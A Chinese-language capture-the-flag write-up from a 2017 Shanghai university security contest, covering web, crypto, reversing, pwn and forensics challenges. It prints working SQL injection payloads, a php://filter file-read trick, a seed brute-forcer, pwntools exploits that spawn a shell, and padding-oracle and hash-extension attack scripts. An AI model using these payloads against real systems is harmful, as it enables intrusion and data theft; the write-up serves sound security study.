---
title: 第三届上海市大学生网络安全大赛WriteUp
---

> 比赛时间是从 11月4日08:00 - 11月5日08:00 ，周末和 Swing 学弟、周师傅 一起打了线上，11月4号晚上还是第三，睡了一觉起来发现第6了。不过进了决赛（前20），18号可以约上海，记录下解题报告WriteUp。

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/74718587.jpg)


# 签到
下载app，加入圈子，查看flag

# Some Words
题目拦截了union,and,=等关键字，但是没有拦截select mid from ascii等关键字，可以利用运算符进行盲注

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg)

但是过于麻烦，可以爆错，那就试试报错注入
`http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select database() limit 1,1),0x7e),1)` 得到当前库，然后得到表和列，最后查询flag

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg)

得到前32位，mid一下得到后面`http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select%20mid(f14g,32,100) from f14g  limit 0,1),0x7e),1)`



# classical
[https://quipqiup.com](https://quipqiup.com/)

替换密码，在上面的链接解决，得到如下：

```
In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog.
```

其中`LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9`这串字符串应该还有一层加密，猜测是还有一层古典密码，尝试去跑凯撒
把凯撒的各种情况跑出来后，进行 `base64` 解码就能得到 `flag`

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg)


# Welcome To My Blog
发现有 `.git` 目录，尝试恢复git https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/
http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/


```bash
$ printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - 3207b7443805336f105c63c6f9948f0c9ae7a4 | gunzip | hexdump -C
```

得到源码

```php
 <?php
include "function.php";
if(isset($_GET["action"])){
  $page = $_GET["action"];
}else{
  $page = "home";
}
if(file_exists($page.'.php')){
  $file = file_get_contents($page.".php");
  echo $file;
}
if(@$_GET["action"]=="album"){
    if(isset($_GET["pid"])){
     curl($_GET["pid"]);
   }
 }
?>
```

发现有  `flag.php`，
访问 `http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/index.php?action=flag`

```php
<?php
$flag="flag{149922b5-27da-44b7-92b5-3c1ccfa75264}";
```

# Step By Step
顺手扫了一下文件，发现有这些文件

```
/robots.txt
/index.php
/file.php
/flag.php
/admin.php
```

打开，`robots.txt` ，里面提示 `code.zip`  ，然后 down 下来是被 `phpjiami` 加密代码，然后解密一下，得到三个源文件 `index.php` 、 `admin.php` 、 `file.php`, 进行代码审计
首先看一下 `index.php`，是一个随机种子爆破的漏洞，写了一个爆破脚本

```php
<?php
ini_set(‘max_execution_time’, ‘0’);

// 初始化seed
$seed = 0;
$key = '填入index.php返回的key值';

function auth_code($length = 12, $special = true) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    if ($special) {
        $chars .= '!@#$%^&*()';
    }
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $password;
}

for($i=0; $i<=99999; $i++){
    mt_srand($i);
    $hash1 = auth_code(16, false);

    if ($hash1 === $key) {
      echo "find seeds :".$i."\n";
      $seed = $i;
      break;
    }
}

$pri = auth_code(10, false);
echo 'private值为： '.$pri;
 ?>

```

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg)

然后发 index.php 发 post 请求，`private=X6B4CdeBOR`，此时会提示 `No private!` ，因为此时session为空，所以第一次会将private存入到session，再发送相同的请求，就会直接跳转到 `http://959b616a1c194d4d83f5b75a7a2f7ec6f63163b4fcbe4482.game.ichunqiu.com/admin.php?authAdmin=2017CtfY0ulike`。

再来看下 `admin.php`， 有一个 `json_decode($auth) == $auth_code` ，使用 0 进行弱类型绕过。此时出来一个表单，但是点击没有反应，查看js，使用了 ajax 进行提交，可以进行抓包。

```js
function() {
  filename = $("#filename").val();
  $.ajax({
    url: 'file.php',
    type: 'post',
    data: {
      'id': filename,
      'auth': '1234567890x'
    },
    dataType: 'text',
    success: function(result) {
      console.log(result);
    },
    error: function(XMLHttpRequest, textStatus, errorThrown) {
      console.log(XMLHttpRequest);
      console.log(textStatus);
      console.log(errorThrown);
    }
  })
}
```

此时再看下 `file.php` ，传 id ，字符串需要包含有 `jpg` 和 满足正则 `preg_match("/^php:\/\/.*resource=([^|]*)/i", trim($id), $matches);` ，于是采用 php://filter 进行读取文件，联系到上面的 `flag.php`,于是 `id=php://filter/read=jpg/resource=flag.php`，拿到 flag

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg)


# crackme

比较简单的应该逆向题目
运行程序，然后附加
这个时候已经出现了

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg)

上面这样的字符串，我们在程序中搜索，并在关键跳转比较的地方下好断点

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg)

可以看到一个比较字符串长度的地方

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg)

所以我们的输入应该是长度为42的字符串

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg)

我们的输入与 `this_is_not_flag` 按位循环异或，然后与

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg)

eax*n+401250比较，我们查看这块内存

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg)

每一位n就会eax的值就会+1 所以刚好对应下面的42给字符

```python
#!/usr/bin/env python
# coding=utf-8

key = 'this_is_not_flag'
num = [0x12, 0x4, 0x8, 0x14, 0x24, 0x5c, 0x4a, 0x3d, 0x56, 0xa, 0x10, 0x67, 0x0, 0x41, 0x0, 0x1, 0x46, 0x5a, 0x44, 0x42, 0x6e, 0xc, 0x44, 0x72, 0xc, 0xd, 0x40, 0x3e, 0x4b, 0x5f, 0x2, 0x1, 0x4c, 0x5e, 0x5b, 0x17, 0x6e, 0xc, 0x16, 0x68, 0x5b, 0x12]

flag =''

for i in range(42):
    n = i%16
    flag += str(chr(ord(key[n])^num[i]))

print flag
```

# juckcode
类base64

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg)

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg)

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg)

```python
import string
import base64

data = file('flag.enc').read().strip()
data1 = ''
for i in data:
    data1 += chr(ord(i)-0x10)
data1 = data1.decode('hex')
bd = base64.b64encode(data1)
t1 = string.uppercase+string.lowercase+string.digits+r'+/'
t2=''
for i in t1:
    t2 += chr(ord(i)-10)
table1 = string.maketrans(t1,t2)
table2 = string.maketrans(t2,t1)
bd1 = bd.translate(table1)
s=''
for i in range(len(bd1)/4):
    s += bd1[4*i]
bd2 = s.translate(table2)
n = 3-len(bd2)%3
bd2 += '='*n
print base64.b64decode(bd2)
```

# 登机牌

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg)

在图片的末尾发现rar字样，扣出来，并且加上rar的头

这是一个rar压缩包，然而加密了

重新找线索，之前二维码利用过了，没什么其他信息，然而，条形码还没用过

反色扫描

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg)

得到key 后面的数字就是密码了  解压得到flag

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg)


# list
题目比较简单，表面看是堆利用的题目，但是其实和堆没什么关系。就是把申请到的chunk的指针依次放入到一个chunk_table中，然后增加chunk数量的索引值。
漏洞出现在Delete函数上，
![](http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg)
可以发现，其实并没有free掉chunk，只是把之前申请到的chunk数量的索引值，做了一个简单的减法。
所以可以一直调用Delete函数，不断的去减少这个索引值，也就说这个索引值可以变成负数，那么就可以索引到我的chunk_table地址之前的任何一个地址。接下来调用Show函数和Edit函数就能按照索引到的这个地址存储的指针来泄漏和修改。
![](http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg)
接下来要想修改GOT表，那么需要我索引到的地址中存了一个GOT表地址，发现确实是有这种地址。
![](http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg)
![](http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg)
也就是说调用Delete函数263007次之后，就能索引到 0x602080 - 8*263007 =0x400588 这个地址，接下来调用Show函数和Edit函数就能泄漏libc，并且修改GOT表了。把这里改成system函数的地址就行了。


```python
from pwn import *

#context.log_level = 'debug'



io = process('./list')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io = remote('106.75.8.58', 13579)
#libc = ELF('./libc.so.6')

def Add(content):
    io.recvuntil('5.Exit\n')
    io.sendline('1')
    io.recvuntil('Input your content:\n')
    io.sendline(content)

def Show():
    io.recvuntil('5.Exit\n')
    io.sendline('2')

def Edit(content):
    io.recvuntil('5.Exit\n')
    io.sendline('3')
    io.send(content)

def Delete():
    io.recvuntil('5.Exit\n')
    io.sendline('4')


for x in xrange(263007):
    #print x
    Delete()

Show()
content = io.recvline(keepends=False)
libc_base = u64(content.ljust(8, '\x00')) - libc.symbols['atoi']
log.info('libc_base = ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']

Edit(p64(system_addr))

io.recvuntil('5.Exit\n')
io.sendline('/bin/sh')

io.interactive()
```

# p200
uaf 控制指针到后门的地方

```python
#!/usr/bin/env python
# coding=utf-8

from pwn import *

elf = ELF("./p200")
io=remote("106.75.8.58",12333)


print io.recvuntil("free\n")
io.sendline("3")
print io.recvuntil("free\n")
io.sendline("3")
print io.recvuntil("free\n")
io.sendline("2")
io.recvuntil("Please input the length:\n")
io.sendline("48")
io.sendline("a"*20)
print io.recvuntil("free\n")
io.sendline("2")
io.recvuntil("Please input the length:\n")
io.sendline("48")
io.sendline(p64(0x602d90)+"mdzzdmzxzasas")

io.interactive()

```
# Is_aes_secure
Padding oracal

```python
from pwn import *

ct = '4141414141414141414141414141414173f880342a533d069b3d2c33ea2c452aaac1cdf6ccb81e51f081a90ea411fe9edbd6bf6de7bab502dabdb9c51b7fb490'
printable_chars = range(32, 128) + range(5,17)
padding_chars = range(1, 17)

def query(cipher, conn):
    cipher = cipher.decode('hex')
    conn.send('3\n')
    conn.recv()
    conn.send(('A'*16).encode('base64'))

    conn.recv()
    conn.send(cipher.encode('base64'))
    if conn.recv() == 'Decrpytion Done\n':
        conn.recv()
        return True
    else:
        conn.recv()
        return False

def int2hex(i):
    '''整数转成十六进制，返回字符串形式，xx，这种方法要记下来放到日志'''
    return hex(i)[2:] if len(hex(i)[2:]) == 2 else '0' + hex(i)[2:]

def exor_pad(i):
    '''输入一个1~16整数，返回一个长度16Byte，前导0，后面用i进行padding的字符串'''
    assert(i > 0)
    assert(i <= 16)
    return  '00' * (16 - i) + int2hex(i) * i

def exor_g(g, pos):
    '''输入guess值，还有需要异或的位置(0~15)，返回一个长度16的前导0、后缀0、中间某一Byte为guess值的字符串'''
    assert(pos >= 0)
    assert(pos < 16)
    return '00' * (15 - pos) + int2hex(g) + '00' * pos

def refill_zero(s):
    '''填充前导0，返回长度32的字符串'''
    return '0' * (32 - len(s)) + s

def strxor(a, b):
    '''xor two strings of different lengths'''
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

def hexexor(s1, s2):
    '''输入的是两个字符串，输出他们异或后的字符串'''
    # 先decode，将字符串转成Byte数据类型，再异或，异或结果后重新编码为字符串
    return strxor(s1.decode("hex"), s2.decode("hex")).encode("hex")

def getConSec():
    conn = remote('106.75.98.74',10010)
    cipher = "c/iANCpTPQabPSwz6ixFKqrBzfbMuB5R8IGpDqQR/p7b1r9t57q1Atq9ucUbf7SQ".decode('base64')
    print conn.recv()
    print conn.recv()
    return conn

def test_a_byte(conn, found_msg, pos, dictinary_, iv, ct, is_padding = False):
    # 功能：穷举一个字节，破解得到明文
    # 输入found_msg为之前已经找到的字符串
    # pos为需要穷举的字节位置：从后开始计数1~16
    # dicitionay为穷举字典：int型范围0~255
    # iv为需要进行异或的字符串，ct为待解密的密文
    # is_padding是检查密文的Padding有效性时候用到，默认false
    pad = exor_pad(pos)
    lastmsg = refill_zero(found_msg.encode("hex"))
    getletter = False
    possible_padding = []
    # 字典破解，我有两个字典：ascii字符和padding集合
    for guess in dictinary_:
        gpad = exor_g(guess, pos - 1)
        # 是把猜想值和lastmsg做异或运算，能否破解成功依赖Lastmsg的正确性。
        if query(hexexor(lastmsg, hexexor(iv, hexexor(gpad, pad))) + ct, conn):
            getletter = True
            new_msg = int2hex(guess).decode("hex") + found_msg
            if is_padding:
                possible_padding.append(guess)
            else:
                return new_msg
    if is_padding:
        return possible_padding
    if getletter == False:
        return None

if __name__ == '__main__':
    conn = getConSec()
    blocks = ()   # 含四个元素，每个元素是长度32的字符串，使用tuple的目的是“不可变”的特性
    while ct:
        blocks = blocks + (ct[:32],)
        ct = ct[32:]

    b = input("input block number to crack:\n#(1~3)")
    iv = blocks[b - 1]   # 截取待破解的前一个block作为IV，其他block都可以丢弃了
    block = blocks[b]

    # 测试最后字节的Padding是否有效
    is_last_block = False
    # if b == 3:
    #     is_last_block = True
    if is_last_block:
        possible_paddings = test_a_byte(conn, '', 1, padding_chars, iv, block, True)
        # 测试经过第一轮筛选处理的padding是否有效
        for i in possible_paddings:
            print "possible padding size is:", i
            msg = chr(i) * i
            start_byte = i + 1
            if test_a_byte(conn, msg, start_byte, printable_chars, iv, block) != None:
                print "good padding size is:", i
                break
    else:
        msg = ''
        start_byte = 1


    # 对选定的block进行16字节的逐个字节破解
    for pos in range(start_byte, 17):
        is_found = test_a_byte(conn, msg, pos, printable_chars, iv, block)
        if is_found:
            msg = is_found
            print "%r" % msg
        else:
            print "can't found the last #%d byte" % pos
            exit(0)
    if is_last_block and msg:
        print "After cutting padding off, the last block is:\n%r" % msg[:-(start_byte - 1)]
```

# clemency
hitcon国内参赛选手提过的一个架构
9bit代替了8bit
在github找了个ida插件

![](http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg)

# 流量分析
1. 搜索flag关键字，发现在一个ftp包中含有flag.zip等字样

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg)

1. 过滤得到ftp完整通信流程将传输的zip文件导出，有密码的压缩包，里面是flag.txt

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg)

1. 通过ftp||ftp-data过滤将key.log导出

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg)

1. 导入key.log为ssl证书

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg)

1. 导入http对象

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg)

1. 打开后为压缩包含mp3，进行分析

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg)

用这个密码去解压压缩包得到flag  flag{4sun0_y0zora_sh0ka1h@}


# rrrsa
hash扩展攻击 ，让用户名里出现root，然后就可以再生成一对ed，同时能看到老的ed，如果两次e相同，那就相当于拿到d了，然后请求一次密文就ok

```python
from pwn import *
import hashpumpy

def getConSec():
    conn = remote('106.75.98.74',10030)
    token = conn.recv()[-33:-1]

    conn.recv()
    return conn,token

def findSameE():
    while True:
        conn, token = getConSec()
        print 'start'
        h = hashpumpy.hashpump(token, 'guest', 'root', 8)
        conn.send('1\n')
        conn.recv()
        conn.send(h[1] + '\n')
        conn.recv()
        conn.send(h[0] + '\n')
        e = conn.recvline()
        e = int(e[4:])
        d = conn.recvline()
        d = int(d[4:])
        print 'e',e
        print 'd',d
        conn.recv()
        conn.recv()

        conn.send('2\n')
        n = conn.recvline()
        n = int(n[4:])
        print 'n', n
        e2 = conn.recvline()
        e2 = int(e2[4:])
        conn.recv()
        print 'finish'
        if e2 == e:
            print '----------------```````````````````---------------------'
            conn.send('3\n')
            f = conn.recv()
            print 'f' , f
            conn.close()
            return f, e, d, n
        else:
            print 'not equal'
            print e2
            print e
            conn.close()

def main():
    flag_enc, e, d, n = findSameE()
    print 'flag_enc :>>', flag_enc
    print 'e and d and n', e, d, n

if __name__ == '__main__':
main()

```

拿到数据后进行解密

```python
from Crypto.Util.number import long_to_bytes
f = 14683015815664558563801576941259873798326690167651050048605500438701684408496420446210954963532410318389297642966435854745489938317707457853711466218044289065290845837536321014853684020186460366403221101008046326997159780567723107338094785513531848765406240418605856262554526167176997869744050412437697207716369805258141774488366641109964920618527096963297754238554764407150841812474020940377383920892323044658675143281286681485516457951570278828305838636179900402944417184295742821658797425171138893795809447102808748184072282008730049190002045912253021436715877710641309577427718880947231481979509491773821558495630

e = 42557
d = 1405803797689753766121124816811438406635097169509938302560321650694887683763354544832446421618462783636223460691651260024139139681435555981044230096841532923821590682557001444031830233529733318151758359126991717193768181340465430448286701933168519305144478953071981857058771098824813044597941221483519691463328674245665508867881940139408259177240035345986021535415530440683317357792630367912626512879140394887502781711233045371334777186553583913805249735850457844171355581182981430494538414242574735347168419095760484924117877688500538899280429652142746708737501656061740113932258961396160464225966939430889959741717
n = 14713918400954955982493042014029607543327552937244083704392427075411297382665292514617418191051874245746867146250517135476460739651464081624520241080001258396231046403732983387521544330625888052283418713567975039010130962446184781994032753116048370897450465028500819451758514917040720299792076872275983155338383970086972864937471593525080347940764126191055849932929374654181884571725974013062466998817258204252680163981682275618928317547959032958679930767406984643684388270842181251832310744561071776712068724629196823024610536091642933627694285340404564988534606855524020291041210781629240781218089956911861804824793

print long_to_bytes(pow(f,d,n))

```



# 问卷调查

![](http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg)
